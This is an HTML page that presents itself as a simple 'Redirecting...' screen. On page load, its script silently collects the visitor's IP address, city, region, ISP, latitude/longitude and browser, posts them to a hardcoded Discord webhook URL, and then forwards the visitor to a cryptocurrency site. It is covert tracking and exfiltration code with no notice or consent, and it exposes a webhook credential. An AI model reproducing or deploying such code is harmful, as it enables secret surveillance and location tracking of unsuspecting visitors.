<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            margin: 0;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <script>
        // Replace 'YOUR_WEBHOOK_URL' with the actual Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1260616650466525267/FKC6zeKdI_JMg7yjkvMLlgjgARHMH2Q1b8DdYxtBrOABOYTb7p2rY2nkTb2i4enDY0D7';

        const deviceName = 'Unknown Device'; // Replace with actual method to get device name
        const browserName = navigator.userAgent.split(' ')[0];

        // Function to send data to Discord webhook as an embed
        function sendDataToDiscord(url, embed) {
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    embeds: [embed],
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send message to Discord');
                }
                console.log('Embed sent to Discord:', response);
            })
            .catch(error => {
                console.error('Error sending embed to Discord:', error);
            });
        }

        // Get user information and redirect immediately
        fetch('https://ipwho.is/')
            .then(response => response.json())
            .then(data => {
                if (!data || !data.success) {
                    console.error('Failed to fetch IP data');
                }

                const embed = {
                    title: 'User Entered',
                    fields: [
                        { name: 'IP Address', value: data.ip, inline: true },
                        { name: 'Country', value: `${data.country} (${data.country_code})`, inline: true },
                        { name: 'Region', value: data.region, inline: true },
                        { name: 'City', value: data.city, inline: true },
                        { name: 'ISP', value: data.connection.isp, inline: true },
                        { name: 'Latitude', value: data.latitude.toString(), inline: true },
                        { name: 'Longitude', value: data.longitude.toString(), inline: true },
                        { name: 'Device Name', value: deviceName, inline: true },
                        { name: 'Browser', value: browserName, inline: true }
                    ],
                    color: 0x00ff00, // Green color
                    timestamp: new Date(),
                    footer: {
                        text: 'Generated by your script'
                    }
                };

                // Send data to Discord webhook as an embed
                sendDataToDiscord(webhookUrl, embed);

                // Redirect the user
                window.location.href = 'https://cryptcoin.live/';
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
                window.location.href = 'https://cryptcoin.live'; // Redirect if there's an error
            });
    </script>
</body>
</html>
